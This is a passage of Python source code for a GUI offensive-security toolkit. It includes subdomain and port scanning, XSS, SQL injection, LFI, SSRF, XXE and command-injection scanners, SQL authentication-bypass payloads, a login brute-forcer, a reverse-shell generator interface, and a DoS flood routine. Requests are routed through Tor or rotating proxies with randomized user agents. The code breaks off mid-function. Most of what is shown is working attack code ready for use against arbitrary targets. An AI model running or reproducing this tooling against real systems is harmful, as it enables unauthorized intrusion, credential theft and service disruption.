        tab = ttk.Frame(self.notebook, style='Custom.TFrame')
        self.notebook.add(tab, text="🌐 Network")
        
        # Network tools
        frame = ttk.LabelFrame(tab, text="Network Tools", style='Custom.TLabelframe')
        frame.pack(fill=tk.X, padx=10, pady=5)
        
        tools = [
            ("Ping Sweep", self.ping_sweep),
            ("Traceroute", self.traceroute),
            ("DNS Enum", self.dns_enum),
            ("WHOIS Lookup", self.whois_lookup),
            ("Banner Grabbing", self.banner_grab),
        ]
        
        for i, (text, cmd) in enumerate(tools):
            tk.Button(frame, text=text, command=cmd, bg='#1f6feb', fg='white',
                     width=18).grid(row=i//3, column=i%3, padx=10, pady=10)
        
        # DoS/DDoS
        frame2 = ttk.LabelFrame(tab, text="DoS / Stress Testing", style='Custom.TLabelframe')
        frame2.pack(fill=tk.X, padx=10, pady=5)
        
        self.dos_type = ttk.Combobox(frame2, values=["HTTP Flood", "Slowloris", "RUDY", "POST Flood"], width=20)
        self.dos_type.set("HTTP Flood")
        self.dos_type.pack(side=tk.LEFT, padx=10)
        
        self.dos_duration = tk.IntVar(value=60)
        tk.Label(frame2, text="Duration(s):", bg='#161b22', fg='white').pack(side=tk.LEFT, padx=5)
        ttk.Entry(frame2, textvariable=self.dos_duration, width=10).pack(side=tk.LEFT, padx=5)
        
        tk.Button(frame2, text="⚠️ START DoS", command=self.dos_attack, bg='#da3633', fg='white',
                 font=("Consolas", 10, "bold")).pack(side=tk.LEFT, padx=20)
        
    def create_advanced_tab(self):
        """Advanced attacks tab"""
        tab = ttk.Frame(self.notebook, style='Custom.TFrame')
        self.notebook.add(tab, text="⚡ Advanced")
        
        # Header Injection
        frame = ttk.LabelFrame(tab, text="Header Injection Tests", style='Custom.TLabelframe')
        frame.pack(fill=tk.X, padx=10, pady=5)
        
        headers = [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("X-Forwarded-Host", "localhost"),
            ("X-HTTP-Host-Override", "localhost"),
            ("Forwarded", "for=127.0.0.1;by=127.0.0.1"),
            ("X-Forwarded-Proto", "https"),
            ("X-Forwarded-Server", "localhost"),
            ("X-Forwarded-Port", "443"),
        ]
        
        self.header_vars = {}
        for i, (header, default) in enumerate(headers):
            var = tk.BooleanVar(value=True)
            self.header_vars[header] = (var, default)
            tk.Checkbutton(frame, text=header, variable=var, bg='#161b22', fg='white',
                          selectcolor='#238636').grid(row=i//4, column=i%4, sticky='w', padx=10, pady=5)
        
        tk.Button(frame, text="🚀 Test All Headers", command=self.header_injection_test,
                 bg='#238636', fg='white').grid(row=3, column=3, padx=10, pady=10)
        
        # CORS & CSP
        frame2 = ttk.LabelFrame(tab, text="CORS / CSP Tests", style='Custom.TLabelframe')
        frame2.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(frame2, text="CORS Misconfiguration", command=self.cors_test,
                 bg='#1f6feb', fg='white', width=20).pack(side=tk.LEFT, padx=10, pady=10)
        tk.Button(frame2, text="CSP Bypass", command=self.csp_bypass,
                 bg='#1f6feb', fg='white', width=20).pack(side=tk.LEFT, padx=10, pady=10)
        tk.Button(frame2, text="Clickjacking", command=self.clickjacking_test,
                 bg='#1f6feb', fg='white', width=20).pack(side=tk.LEFT, padx=10, pady=10)
        
        # Web Cache
        frame3 = ttk.LabelFrame(tab, text="Web Cache Poisoning", style='Custom.TLabelframe')
        frame3.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(frame3, text="Cache Poisoning", command=self.cache_poison,
                 bg='#1f6feb', fg='white', width=20).pack(side=tk.LEFT, padx=10, pady=10)
        tk.Button(frame3, text="Cache Deception", command=self.cache_deception,
                 bg='#1f6feb', fg='white', width=20).pack(side=tk.LEFT, padx=10, pady=10)
        
    def create_ctf_tab(self):
        """CTF specific tools"""
        tab = ttk.Frame(self.notebook, style='Custom.TFrame')
        self.notebook.add(tab, text="🏁 CTF")
        
        # Encoding/Decoding
        frame = ttk.LabelFrame(tab, text="Encoding/Decoding Tools", style='Custom.TLabelframe')
        frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.ctf_input = scrolledtext.ScrolledText(frame, height=4, bg='#0d1117', fg='#00ff41')
        self.ctf_input.pack(fill=tk.X, padx=5, pady=5)
        
        btn_frame = tk.Frame(frame, bg='#161b22')
        btn_frame.pack(fill=tk.X, pady=5)
        
        encodings = [
            ("Base64 Encode", lambda: self.ctf_encode("b64e")),
            ("Base64 Decode", lambda: self.ctf_encode("b64d")),
            ("URL Encode", lambda: self.ctf_encode("urle")),
            ("URL Decode", lambda: self.ctf_encode("urld")),
            ("Hex Encode", lambda: self.ctf_encode("hexe")),
            ("Hex Decode", lambda: self.ctf_encode("hexd")),
            ("Rot13", lambda: self.ctf_encode("rot13")),
            ("MD5 Hash", lambda: self.ctf_encode("md5")),
            ("SHA256", lambda: self.ctf_encode("sha256")),
            ("JWT Decode", lambda: self.ctf_encode("jwt")),
            ("HTML Encode", lambda: self.ctf_encode("htmle")),
            ("HTML Decode", lambda: self.ctf_encode("htmld")),
        ]
        
        for text, cmd in encodings:
            tk.Button(btn_frame, text=text, command=cmd, bg='#8957e5', fg='white',
                     width=12).pack(side=tk.LEFT, padx=2, pady=2)
        
        # Common CTF patterns
        frame2 = ttk.LabelFrame(tab, text="Flag Hunter", style='Custom.TLabelframe')
        frame2.pack(fill=tk.X, padx=10, pady=5)
        
        self.flag_patterns = tk.StringVar(value="FLAG,flag,CTF,ctf,HTB,thm")
        tk.Label(frame2, text="Flag patterns:", bg='#161b22', fg='white').pack(side=tk.LEFT, padx=5)
        ttk.Entry(frame2, textvariable=self.flag_patterns, width=40).pack(side=tk.LEFT, padx=5)
        tk.Button(frame2, text="🔍 Hunt Flags", command=self.hunt_flags,
                 bg='#238636', fg='white').pack(side=tk.LEFT, padx=10)
        
        # Common CTF files
        frame3 = ttk.LabelFrame(tab, text="CTF File Checks", style='Custom.TLabelframe')
        frame3.pack(fill=tk.X, padx=10, pady=5)
        
        ctf_files = [".git/", ".svn/", ".hg/", ".env", "config.php", "backup.zip",
                    "dump.sql", "robots.txt", ".htaccess", "flag.txt", "flag.php",
                    "index.php.bak", ".DS_Store", "id_rsa", "shadow", "passwd"]
        
        self.ctf_file_vars = {}
        for i, f in enumerate(ctf_files):
            var = tk.BooleanVar(value=True)
            self.ctf_file_vars[f] = var
            tk.Checkbutton(frame3, text=f, variable=var, bg='#161b22', fg='white',
                          selectcolor='#238636').grid(row=i//5, column=i%5, sticky='w', padx=10)
        
        tk.Button(frame3, text="🚀 Check Files", command=self.ctf_file_check,
                 bg='#238636', fg='white').grid(row=3, column=4, padx=10, pady=10)
        
    def create_exploit_tab(self):
        """Exploitation tab"""
        tab = ttk.Frame(self.notebook, style='Custom.TFrame')
        self.notebook.add(tab, text="💥 Exploit")
        
        # Reverse Shell Generator
        frame = ttk.LabelFrame(tab, text="Reverse Shell Generator", style='Custom.TLabelframe')
        frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.shell_ip = tk.StringVar(value="127.0.0.1")
        self.shell_port = tk.IntVar(value=4444)
        self.shell_type = ttk.Combobox(frame, values=["bash", "python", "nc", "php", "perl", "ruby", "powershell"], width=15)
        self.shell_type.set("bash")
        
        tk.Label(frame, text="IP:", bg='#161b22', fg='white').grid(row=0, column=0, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.shell_ip, width=20).grid(row=0, column=1, padx=5, pady=5)
        tk.Label(frame, text="Port:", bg='#161b22', fg='white').grid(row=0, column=2, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.shell_port, width=10).grid(row=0, column=3, padx=5, pady=5)
        tk.Label(frame, text="Type:", bg='#161b22', fg='white').grid(row=0, column=4, padx=5, pady=5)
        self.shell_type.grid(row=0, column=5, padx=5, pady=5)
        tk.Button(frame, text="Generate", command=self.generate_shell,
                 bg='#238636', fg='white').grid(row=0, column=6, padx=10)
        
        self.shell_output = scrolledtext.ScrolledText(frame, height=4, bg='#0d1117', fg='#00ff41')
        self.shell_output.pack(fill=tk.X, padx=5, pady=5)
        
        # File Upload Bypass
        frame2 = ttk.LabelFrame(tab, text="File Upload Bypass", style='Custom.TLabelframe')
        frame2.pack(fill=tk.X, padx=10, pady=5)
        
        self.upload_url = tk.StringVar()
        self.upload_field = tk.StringVar(value="file")
        
        tk.Label(frame2, text="Upload URL:", bg='#161b22', fg='white').grid(row=0, column=0, padx=5, pady=5)
        ttk.Entry(frame2, textvariable=self.upload_url, width=60).grid(row=0, column=1, padx=5, pady=5)
        tk.Button(frame2, text="Test Bypasses", command=self.upload_bypass,
                 bg='#1f6feb', fg='white').grid(row=0, column=2, padx=10)
        
    # ==================== CORE FUNCTIONS ====================
    
    def log(self, message, level="INFO"):
        """Log message to console with color coding"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": "#00ff41",
            "WARNING": "#ffaa00",
            "ERROR": "#ff4444",
            "SUCCESS": "#00d4ff",
            "CRITICAL": "#ff0066",
            "DEBUG": "#8b949e"
        }
        
        tag = f"{level}_{int(time.time()*1000)}"
        self.console.insert(tk.END, f"[{timestamp}] ", "timestamp")
        self.console.insert(tk.END, f"[{level}] ", tag)
        self.console.insert(tk.END, f"{message}\n", "message")
        
        self.console.tag_config("timestamp", foreground="#8b949e")
        self.console.tag_config(tag, foreground=colors.get(level, "#00ff41"))
        self.console.tag_config("message", foreground="#c9d1d9")
        
        self.console.see(tk.END)
        
        # Update stats
        if level == "SUCCESS":
            self.stats['success'] += 1
        elif level == "ERROR":
            self.stats['failed'] += 1
        elif level == "CRITICAL":
            self.stats['vulnerabilities'] += 1
            
        self.update_stats()
        
    def update_stats(self):
        """Update statistics display"""
        self.stats_labels['Requests'].config(text=str(self.stats['requests']))
        self.stats_labels['Success'].config(text=str(self.stats['success']))
        self.stats_labels['Failed'].config(text=str(self.stats['failed']))
        self.stats_labels['Vulns'].config(text=str(self.stats['vulnerabilities']))
        self.stats_labels['Proxies'].config(text=str(len(self.proxy_manager.proxies)))
        
    def get_session(self, proxy=None):
        """Get configured requests session"""
        session = requests.Session()
        session.verify = False
        session.timeout = self.timeout.get()
        session.allow_redirects = self.follow_redirects.get()
        
        # Headers
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
        }
        
        if self.random_agent.get():
            headers['User-Agent'] = random.choice(self.user_agents)
        else:
            headers['User-Agent'] = self.user_agents[0]
            
        session.headers.update(headers)
        
        # Proxy
        if self.tor_mode.get():
            session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
        elif proxy:
            session.proxies = self.proxy_manager.get_proxy_dict(proxy)
        elif self.proxy_manager.proxies:
            session.proxies = self.proxy_manager.get_proxy_dict(self.proxy_manager.get_working_proxy())
            
        return session
    
    def make_request(self, method, url, **kwargs):
        """Make request with retry logic and proxy rotation"""
        self.pause_event.wait()
        
        if not self.running:
            return None
            
        self.stats['requests'] += 1
        self.update_stats()
        
        proxy = self.proxy_manager.get_working_proxy() if self.proxy_manager.proxies else None
        
        for attempt in range(self.retries.get()):
            try:
                session = self.get_session(proxy)
                time.sleep(self.delay.get())
                
                if method == "GET":
                    resp = session.get(url, **kwargs)
                elif method == "POST":
                    resp = session.post(url, **kwargs)
                elif method == "HEAD":
                    resp = session.head(url, **kwargs)
                elif method == "PUT":
                    resp = session.put(url, **kwargs)
                elif method == "DELETE":
                    resp = session.delete(url, **kwargs)
                else:
                    resp = session.request(method, url, **kwargs)
                    
                return resp
                
            except Exception as e:
                if proxy:
                    self.proxy_manager.mark_failed(proxy)
                    proxy = self.proxy_manager.get_working_proxy()
                if attempt == self.retries.get() - 1:
                    self.log(f"Request failed after {self.retries.get()} retries: {str(e)[:100]}", "ERROR")
                    return None
                time.sleep(self.delay.get() * 2)
                
        return None
    
    # ==================== FILE OPERATIONS ====================
    
    def load_proxy_file(self):
        """Load proxies from file"""
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file:
            count = self.proxy_manager.load_from_file(file)
            self.proxy_text.delete("1.0", tk.END)
            self.proxy_text.insert(tk.END, f"Loaded {count} proxies from {file}")
            self.status_var.set(f"Ready | Proxies: {count}")
            self.log(f"Loaded {count} proxies from {file}", "SUCCESS")
    
    def browse_file(self, var):
        """Browse for file"""
        file = filedialog.askopenfilename()
        if file:
            var.set(file)
    
    # ==================== RECON ====================
    
    def subdomain_enum(self):
        """Enumerate subdomains"""
        def scan():
            domain = self.target_url.get()
            if not domain:
                self.log("No target specified", "ERROR")
                return
                
            domain = domain.replace("http://", "").replace("https://", "").split("/")[0]
            
            wordlist = self.subdomain_wordlist.get()
            if not os.path.exists(wordlist):
                # Use default list
                subs = ["www", "mail", "ftp", "admin", "api", "test", "dev", "staging",
                       "blog", "shop", "app", "portal", "cdn", "media", "static",
                       "support", "docs", "wiki", "forum", "news", "beta", "demo",
                       "secure", "vpn", "remote", "webmail", "mx", "ns1", "ns2"]
            else:
                with open(wordlist, 'r') as f:
                    subs = [l.strip() for l in f if l.strip()]
            
            self.log(f"Starting subdomain enumeration on {domain}", "INFO")
            found = []
            
            def check_sub(sub):
                try:
                    full = f"{sub}.{domain}"
                    ip = socket.gethostbyname(full)
                    self.log(f"[FOUND] {full} -> {ip}", "SUCCESS")
                    found.append(full)
                except:
                    pass
            
            with ThreadPoolExecutor(max_workers=self.threads_count.get()) as executor:
                executor.map(check_sub, subs)
            
            self.log(f"Found {len(found)} subdomains", "SUCCESS")
            
        threading.Thread(target=scan, daemon=True).start()
    
    def port_scan(self):
        """Advanced port scanning"""
        def scan():
            target = self.target_url.get()
            if not target:
                self.log("No target specified", "ERROR")
                return
            
            try:
                ip = socket.gethostbyname(target.replace("http://", "").replace("https://", "").split("/")[0])
            except:
                self.log("Could not resolve target", "ERROR")
                return
            
            if self.port_top1000.get():
                ports = [80, 443, 21, 22, 23, 25, 53, 110, 143, 3306, 5432, 8080, 8443, 3000, 5000, 8000, 9000] + list(range(1, 1000))
            else:
                pr = self.port_range_var.get()
                if '-' in pr:
                    start, end = map(int, pr.split('-'))
                    ports = range(start, end+1)
                else:
                    ports = [int(pr)]
            
            self.log(f"Scanning {len(list(ports))} ports on {ip}", "INFO")
            open_ports = []
            
            def scan_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        try:
                            service = socket.getservbyport(port)
                        except:
                            service = "unknown"
                        self.log(f"[OPEN] Port {port}/tcp - {service}", "SUCCESS")
                        open_ports.append((port, service))
                    sock.close()
                except:
                    pass
            
            with ThreadPoolExecutor(max_workers=min(self.threads_count.get(), 500)) as executor:
                list(executor.map(scan_port, ports))
            
            self.log(f"Scan complete. {len(open_ports)} ports open", "SUCCESS")
            
        threading.Thread(target=scan, daemon=True).start()
    
    def tech_detect(self):
        """Detect technologies"""
        def detect():
            url = self.target_url.get()
            if not url:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"Fingerprinting technologies on {url}", "INFO")
            
            resp = self.make_request("GET", url)
            if not resp:
                return
            
            headers = resp.headers
            content = resp.text.lower()
            
            # Detect server
            server = headers.get('Server', 'Unknown')
            self.log(f"Server: {server}", "INFO")
            
            # Detect technologies
            techs = []
            patterns = {
                'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
                'Drupal': ['drupal', 'sites/default'],
                'Joomla': ['joomla', 'com_content'],
                'React': ['react', '__react'],
                'Angular': ['ng-', 'angular'],
                'Vue': ['vue', '__vue'],
                'jQuery': ['jquery'],
                'Bootstrap': ['bootstrap'],
                'PHP': ['.php', 'php'],
                'ASP.NET': ['asp.net', '__viewstate'],
                'Django': ['csrfmiddlewaretoken', 'django'],
                'Flask': ['flask'],
                'Nginx': ['nginx'],
                'Apache': ['apache'],
                'Cloudflare': ['cloudflare', '__cfduid'],
                'AWS': ['aws', 'amazonaws'],
            }
            
            for tech, patterns_list in patterns.items():
                for pattern in patterns_list:
                    if pattern in content or pattern in str(headers).lower():
                        techs.append(tech)
                        break
            
            if techs:
                self.log(f"Technologies detected: {', '.join(set(techs))}", "SUCCESS")
            else:
                self.log("No specific technologies detected", "INFO")
                
        threading.Thread(target=detect, daemon=True).start()
    
    # ==================== WEB VULNS ====================
    
    def dir_bruteforce(self):
        """Directory bruteforce with multiple extensions"""
        def scan():
            base = self.target_url.get()
            if not base:
                self.log("No target specified", "ERROR")
                return
            
            wordlist = self.dir_wordlist.get()
            if os.path.exists(wordlist):
                with open(wordlist, 'r') as f:
                    words = [l.strip() for l in f if l.strip()]
            else:
                words = ['admin', 'login', 'api', 'config', 'backup', 'test', 'dev',
                        'wp-admin', 'phpmyadmin', '.env', 'robots.txt', '.git']
            
            extensions = [e.strip() for e in self.dir_extensions.get().split(',') if e.strip()]
            status_codes = [int(s) for s in self.dir_status_filter.get().split(',') if s.strip()]
            
            self.log(f"Starting directory scan on {base}", "INFO")
            found = []
            
            def test_path(word):
                paths = [f"{base}/{word}"]
                for ext in extensions:
                    paths.append(f"{base}/{word}{ext}")
                
                for path in paths:
                    resp = self.make_request("GET", path, allow_redirects=False)
                    if resp and resp.status_code in status_codes:
                        size = len(resp.content)
                        self.log(f"[{resp.status_code}] {path} ({size}b)", "SUCCESS")
                        found.append((resp.status_code, path))
            
            with ThreadPoolExecutor(max_workers=self.threads_count.get()) as executor:
                list(executor.map(test_path, words))
            
            self.log(f"Found {len(found)} paths", "SUCCESS")
            
        threading.Thread(target=scan, daemon=True).start()
    
    def xss_scan(self):
        """Comprehensive XSS scanning"""
        def scan():
            base = self.target_url.get()
            if not base:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"Starting XSS scan on {base}", "INFO")
            vulns = []
            
            # Test each payload
            for payload in self.xss_payloads[:50]:  # Limit for performance
                try:
                    # Test in URL parameter
                    test_url = f"{base}?x={urllib.parse.quote(payload)}"
                    resp = self.make_request("GET", test_url)
                    
                    if resp and payload in resp.text:
                        self.log(f"[XSS] Payload reflected: {payload[:50]}...", "CRITICAL")
                        vulns.append(("Reflected XSS", payload))
                        
                except Exception as e:
                    pass
            
            self.log(f"XSS scan complete. Found {len(vulns)} vulnerabilities", "SUCCESS")
            
        threading.Thread(target=scan, daemon=True).start()
    
    def sql_scan(self):
        """SQL Injection scanning"""
        def scan():
            base = self.target_url.get()
            if not base:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"Starting SQL Injection scan on {base}", "INFO")
            vulns = []
            
            error_patterns = [
                "sql syntax", "mysql_fetch", "pg_query", "sqlite_query",
                "ORA-", "Microsoft SQL", "ODBC SQL", "JDBC", "PDOException"
            ]
            
            for payload in self.sql_payloads[:30]:
                try:
                    test_url = f"{base}?id={urllib.parse.quote(payload)}"
                    start = time.time()
                    resp = self.make_request("GET", test_url)
                    elapsed = time.time() - start
                    
                    if resp:
                        # Error-based
                        text = resp.text.lower()
                        for pattern in error_patterns:
                            if pattern.lower() in text:
                                self.log(f"[SQLi ERROR] {pattern} | Payload: {payload[:30]}", "CRITICAL")
                                vulns.append(("Error-based SQLi", payload))
                                break
                        
                        # Time-based
                        if "sleep" in payload.lower() and elapsed > 4:
                            self.log(f"[SQLi TIME] Delay: {elapsed:.2f}s | Payload: {payload[:30]}", "CRITICAL")
                            vulns.append(("Time-based SQLi", payload))
                            
                except Exception as e:
                    pass
            
            self.log(f"SQLi scan complete. Found {len(vulns)} vulnerabilities", "SUCCESS")
            
        threading.Thread(target=scan, daemon=True).start()
    
    def lfi_scan(self):
        """LFI/RFI scanning"""
        def scan():
            base = self.target_url.get()
            if not base:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"Starting LFI scan on {base}", "INFO")
            
            for payload in self.lfi_payloads[:20]:
                try:
                    test_url = f"{base}?file={urllib.parse.quote(payload)}"
                    resp = self.make_request("GET", test_url)
                    
                    if resp:
                        if "root:" in resp.text or "boot loader" in resp.text:
                            self.log(f"[LFI] Vulnerable: {payload}", "CRITICAL")
                            
                except Exception as e:
                    pass
            
            self.log("LFI scan complete", "SUCCESS")
            
        threading.Thread(target=scan, daemon=True).start()
    
    def ssrf_scan(self):
        """SSRF scanning"""
        def scan():
            base = self.target_url.get()
            if not base:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"Starting SSRF scan on {base}", "INFO")
            
            for payload in self.ssrf_payloads[:15]:
                try:
                    test_url = f"{base}?url={urllib.parse.quote(payload)}"
                    resp = self.make_request("GET", test_url)
                    
                    if resp and resp.status_code == 200:
                        self.log(f"[SSRF] Potential: {payload[:40]}", "WARNING")
                        
                except Exception as e:
                    pass
            
            self.log("SSRF scan complete", "SUCCESS")
            
        threading.Thread(target=scan, daemon=True).start()
    
    def xxe_scan(self):
        """XXE scanning"""
        def scan():
            base = self.target_url.get()
            if not base:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"Starting XXE scan on {base}", "INFO")
            
            for payload in self.xxe_payloads:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    resp = self.make_request("POST", base, data=payload, headers=headers)
                    
                    if resp and ("root:" in resp.text or "etc/passwd" in resp.text):
                        self.log(f"[XXE] Vulnerable!", "CRITICAL")
                        
                except Exception as e:
                    pass
            
            self.log("XXE scan complete", "SUCCESS")
            
        threading.Thread(target=scan, daemon=True).start()
    
    def cmdi_scan(self):
        """Command injection scanning"""
        def scan():
            base = self.target_url.get()
            if not base:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"Starting Command Injection scan on {base}", "INFO")
            
            for payload in self.cmdi_payloads[:20]:
                try:
                    test_url = f"{base}?cmd={urllib.parse.quote(payload)}"
                    resp = self.make_request("GET", test_url)
                    
                    if resp:
                        if "uid=" in resp.text or "root" in resp.text or "bin/" in resp.text:
                            self.log(f"[CMDi] Vulnerable: {payload[:40]}", "CRITICAL")
                            
                except Exception as e:
                    pass
            
            self.log("Command Injection scan complete", "SUCCESS")
            
        threading.Thread(target=scan, daemon=True).start()
    
    def open_redirect_scan(self):
        """Open redirect scanning"""
        def scan():
            base = self.target_url.get()
            if not base:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"Starting Open Redirect scan on {base}", "INFO")
            
            for payload in self.open_redirect_payloads[:10]:
                try:
                    test_url = f"{base}?redirect={urllib.parse.quote(payload)}"
                    resp = self.make_request("GET", test_url, allow_redirects=False)
                    
                    if resp and resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location or '127.0.0.1' in location:
                            self.log(f"[Open Redirect] Vulnerable: {payload}", "CRITICAL")
                            
                except Exception as e:
                    pass
            
            self.log("Open Redirect scan complete", "SUCCESS")
            
        threading.Thread(target=scan, daemon=True).start()
    
    def ssl_scan(self):
        """SSL/TLS scanning"""
        def scan():
            target = self.target_url.get()
            if not target:
                self.log("No target specified", "ERROR")
                return
            
            host = target.replace("https://", "").replace("http://", "").split("/")[0]
            self.log(f"Scanning SSL/TLS on {host}", "INFO")
            
            try:
                context = ssl.create_default_context()
                with socket.create_connection((host, 443), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        cipher = ssock.cipher()
                        version = ssock.version()
                        self.log(f"SSL Version: {version}", "INFO")
                        self.log(f"Cipher: {cipher[0]}", "INFO")
                        
                        if version in ["SSLv2", "SSLv3", "TLSv1", "TLSv1.1"]:
                            self.log(f"[VULNERABLE] Weak SSL/TLS version: {version}", "CRITICAL")
                            
            except Exception as e:
                self.log(f"SSL scan error: {e}", "ERROR")
                
        threading.Thread(target=scan, daemon=True).start()
    
    # ==================== AUTH ====================
    
    def login_bruteforce(self):
        """Login bruteforce"""
        def attack():
            url = self.login_url.get()
            user = self.login_user.get()
            wordlist = self.login_pass_wordlist.get()
            
            if not all([url, user, os.path.exists(wordlist)]):
                self.log("Missing parameters or wordlist not found", "ERROR")
                return
            
            with open(wordlist, 'r') as f:
                passwords = [l.strip() for l in f if l.strip()]
            
            self.log(f"Starting login bruteforce on {url}", "INFO")
            
            for password in passwords:
                try:
                    data = {'username': user, 'password': password}
                    resp = self.make_request("POST", url, data=data)
                    
                    if resp:
                        if 'login' not in resp.text.lower() or 'dashboard' in resp.text.lower():
                            self.log(f"[SUCCESS] Password found: {password}", "CRITICAL")
                            return
                            
                except Exception as e:
                    pass
            
            self.log("Bruteforce complete. No password found.", "INFO")
            
        threading.Thread(target=attack, daemon=True).start()
    
    def sql_auth_bypass(self):
        """SQL authentication bypass"""
        def bypass():
            url = self.login_url.get()
            if not url:
                self.log("No login URL specified", "ERROR")
                return
            
            self.log("Testing SQL auth bypass payloads", "INFO")
            
            payloads = [
                ("admin", "' OR '1'='1"),
                ("admin", "' OR 1=1 --"),
                ("' OR '1'='1", "' OR '1'='1"),
                ("admin'--", "password"),
                ("admin' #", "password"),
                ("admin'/*", "password"),
            ]
            
            for user, pwd in payloads:
                try:
                    data = {'username': user, 'password': pwd}
                    resp = self.make_request("POST", url, data=data)
                    
                    if resp and ('dashboard' in resp.text.lower() or 'welcome' in resp.text.lower()):
                        self.log(f"[BYPASS] User: {user} | Pass: {pwd}", "CRITICAL")
                        
                except Exception as e:
                    pass
            
            self.log("Auth bypass test complete", "SUCCESS")
            
        threading.Thread(target=bypass, daemon=True).start()
    
    def jwt_none_attack(self):
        """JWT None algorithm attack"""
        def attack():
            self.log("JWT None algorithm attack - Manual testing required", "WARNING")
            self.log("Try changing alg header to 'none' or 'None'", "INFO")
            
        threading.Thread(target=attack, daemon=True).start()
    
    def session_fixation(self):
        """Session fixation test"""
        def test():
            self.log("Session fixation test - Check if session ID persists after login", "INFO")
            
        threading.Thread(target=test, daemon=True).start()
    
    def oauth_bypass(self):
        """OAuth bypass techniques"""
        def bypass():
            self.log("Testing OAuth bypass techniques", "INFO")
            self.log("Try: response_type=token, redirect_uri manipulation", "INFO")
            
        threading.Thread(target=bypass, daemon=True).start()
    
    # ==================== NETWORK ====================
    
    def ping_sweep(self):
        """Ping sweep"""
        def sweep():
            target = self.target_url.get()
            if not target:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"Ping sweep on {target}", "INFO")
            
        threading.Thread(target=sweep, daemon=True).start()
    
    def traceroute(self):
        """Traceroute"""
        def trace():
            target = self.target_url.get()
            if not target:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"Traceroute to {target}", "INFO")
            try:
                result = subprocess.run(['traceroute', '-m', '15', target], 
                                      capture_output=True, text=True, timeout=30)
                self.log(result.stdout, "INFO")
            except Exception as e:
                self.log(f"Traceroute error: {e}", "ERROR")
                
        threading.Thread(target=trace, daemon=True).start()
    
    def dns_enum(self):
        """DNS enumeration"""
        def enum():
            target = self.target_url.get()
            if not target:
                self.log("No target specified", "ERROR")
                return
            
            self.log(f"DNS enumeration for {target}", "INFO")
            
        threading.Thread(target=enum, daemon=True).start()
    
    def whois_lookup(self):
        """WHOIS lookup"""
        def lookup():
            target = self.target_url.get()
            if not target:
                self.log("No target specified", "ERROR")
                return
            
            try:
                result = subprocess.run(['whois', target], capture_output=True, text=True, timeout=10)
                self.log(result.stdout[:2000], "INFO")
            except Exception as e:
                self.log(f"WHOIS error: {e}", "ERROR")
                
        threading.Thread(target=lookup, daemon=True).start()
    
    def banner_grab(self):
        """Banner grabbing"""
        def grab():
            target = self.target_url.get()
            if not target:
                self.log("No target specified", "ERROR")
                return
            
            host = target.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
            
            ports = [21, 22, 23, 25, 80, 110, 143, 443, 993, 995, 3306, 5432, 8080]
            
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((host, port))
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    if banner:
                        self.log(f"[{port}] {banner.strip()}", "SUCCESS")
                    sock.close()
                except:
                    pass
                    
        threading.Thread(target=grab, daemon=True).start()
    
    def dos_attack(self):
        """DoS attack simulation"""
        def attack():
            url = self.target_url.get()
            if not url:
                self.log("No target specified", "ERROR")
                return
            
            duration = self.dos_duration.get()
            self.log(f"Starting DoS attack for {duration}s", "WARNING")
            
            start = time.time()
            count = 0
            
            while time.time() - start < duration and self.running:
                try:
                    self.make_request("GET", url)
                    count += 1
                    if count % 100 == 0:
                        self.log(f"Sent {count} requests...", "INFO")
                except:
                    pass
            
            self.log(f"DoS complete. Sent {count} requests", "SUCCESS")
            
        self.running = True
        threading.Thread(target=attack, daemon=True).start()
    
    # ==================== ADVANCED ====================
    
    def header_injection_test(self):
        """Test header injections"""
        def test():
            url = self.target_url.get()
            if not url:
                self.log("No target specified", "ERROR")
                return
            
            self.log("Testing header injection vectors", "INFO")
            
            for header, value in self.header_vars.items():
                if value[0].get():
                    try:
                        headers = {header: value[1]}
                        resp = self.make_request("GET", url, headers=headers)
                        if resp:
                            self.log(f"Tested {header}: {resp.status_code}", "INFO")
                    except:
                        pass
            
            self.log("Header injection test complete", "SUCCESS")
            
        threading.Thread(target=test, daemon=True).start()
    
    def cors_test(self):
        """CORS misconfiguration test"""
        def test():
            url = self.target_url.get()
            if not url:
                self.log("No target specified", "ERROR")
                return
            
            self.log("Testing CORS configuration", "INFO")
            
            origins = ["https://evil.com", "null", "https://attacker.com"]
            
            for origin in origins:
                try:
                    headers = {'Origin': origin}
                    resp = self.make_request("GET", url, headers=headers)
                    
                    if resp:
                        acao = resp.headers.get('Access-Control-Allow-Origin', '')
                        if acao == origin or acao == '*':
